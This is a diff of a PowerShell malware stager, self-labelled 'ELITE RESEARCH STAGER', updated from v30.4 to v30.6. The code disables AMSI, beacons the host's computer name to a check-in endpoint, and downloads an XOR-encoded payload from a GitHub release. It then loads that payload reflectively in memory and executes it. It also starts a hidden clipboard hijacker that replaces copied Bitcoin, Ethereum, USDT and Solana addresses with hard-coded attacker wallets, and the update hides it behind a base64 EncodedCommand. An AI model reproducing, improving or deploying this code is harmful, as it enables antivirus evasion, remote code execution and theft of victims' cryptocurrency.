@@ -1,6 +1,6 @@
-# --- [ELITE RESEARCH STAGER v30.4: MEMORY-SYNC + CERTUTIL COMPATIBLE] ---
+# --- [ELITE RESEARCH STAGER v30.6: BASE64-ONLY RAM INJECT] ---
 
-# Bypass AMSI via memory-only buffer patch
+# Disable AMSI using a memory-only flag patch
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 function Send-Ping {
@@ -11,48 +11,44 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch {}
 }
 
-Send-Ping -m "V30.4_GHOST_BOOT_$($env:COMPUTERNAME)"
+Send-Ping -m "V30.6_GHOST_BOOT_$($env:COMPUTERNAME)"
 
 try {
-    # 1. RAM-Only Download of the XOR Payload
-    $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $wc = New-Object Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-    $raw = $wc.DownloadString($u)
-    
-    # 2. XOR Decrypt to Byte Array (In-Memory)
+    # 1. Download the XOR data directly into a variable
+    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $raw = (New-Object Net.WebClient).DownloadString($url)
+
+    # 2. Convert and XOR Decrypt in memory
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
 
-    # 3. Reflective Assembly Load (Secret RAM Install)
-    # This loads the EXE bytes directly into the PowerShell process space
+    # 3. Reflective Load (Secret RAM Install)
+    # The assembly is loaded into the PowerShell process RAM space
     $Assembly = [System.Reflection.Assembly]::Load($data)
-    $Entry = $Assembly.EntryPoint
     
-    # 4. Threaded Clipper (Run in Background)
-    $C = {
-        Add-Type -AssemblyName System.Windows.Forms
-        $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
-        while($true) {
-            try {
-                if ([System.Windows.Forms.Clipboard]::ContainsText()) {
-                    $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
-                    if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
-                    elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
-                    elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
-                    elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
-                }
-            } catch {}
-            Start-Sleep -Milliseconds 500
-        }
+    # 4. Clipper Engine (As an Encoded Command to stay hidden)
+    $C = @'
+    Add-Type -AssemblyName System.Windows.Forms
+    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
+    while($true) {
+        try {
+            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
+                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
+                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
+                elseif ($v -match "^0x[a-fA-F0-9]{40}$") { if ($v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
+                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
+                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
+            }
+        } catch {}
+        Start-Sleep -m 500
     }
-    
-    # Launch Payload Entry + Clipper
-    $Entry.Invoke($null, @(,[string[]]@()))
-    powershell -NoP -W Hidden -EP Bypass -C $C
-    
-    Send-Ping -m "V30.4_SUCCESS_NO_DISK_TRACE"
+'@
+    # Run the Clipper and the Loaded Assembly together
+    $Assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
+    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($C))
+    powershell -NoP -W Hidden -EP Bypass -EncodedCommand $enc
 
+    Send-Ping -m "V30.6_SUCCESS_IN_RAM"
 } catch {
-    Send-Ping -m "V30.4_ERR: $($_.Exception.Message)"
+    Send-Ping -m "V30.6_FAIL: $($_.Exception.Message)"
 }
